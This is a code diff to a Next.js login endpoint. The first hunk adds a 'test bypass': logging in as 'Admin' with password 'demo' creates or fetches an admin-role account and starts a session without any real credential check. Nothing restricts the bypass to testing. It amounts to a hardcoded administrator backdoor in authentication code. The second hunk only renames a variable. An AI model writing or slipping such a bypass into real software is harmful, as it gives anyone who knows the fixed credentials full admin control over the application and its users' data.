@@ -26,6 +26,50 @@ export async function POST(request: NextRequest) {
 
     const { username, password } = result.data;
 
+    // Test bypass: Allow Admin/demo for testing
+    if (username === 'Admin' && password === 'demo') {
+      // Find or create test admin user
+      const [existingUser] = await db
+        .select()
+        .from(users)
+        .where(eq(users.username, 'Admin'))
+        .limit(1);
+
+      let user;
+      if (existingUser) {
+        user = existingUser;
+        // Update last login time
+        await db
+          .update(users)
+          .set({ lastLoginAt: new Date() })
+          .where(eq(users.id, user.id));
+      } else {
+        // Create test admin user
+        const { hashPassword } = await import('@/lib/password');
+        const passwordHash = await hashPassword('demo');
+        const [newUser] = await db
+          .insert(users)
+          .values({
+            username: 'Admin',
+            passwordHash,
+            role: 'admin',
+            isActive: true,
+          })
+          .returning();
+        user = newUser;
+      }
+
+      // Set session
+      await setSession(user.id);
+
+      // Return user info (without password hash)
+      const { passwordHash: _, ...userWithoutPassword } = user;
+      return NextResponse.json({
+        success: true,
+        user: userWithoutPassword,
+      });
+    }
+
     // Find user
     const [user] = await db
       .select()
@@ -67,7 +111,7 @@ export async function POST(request: NextRequest) {
     await setSession(user.id);
 
     // Return user info (without password hash)
-    const { passwordHash, ...userWithoutPassword } = user;
+    const { passwordHash: _1, ...userWithoutPassword } = user;
     return NextResponse.json({
       success: true,
       user: userWithoutPassword,
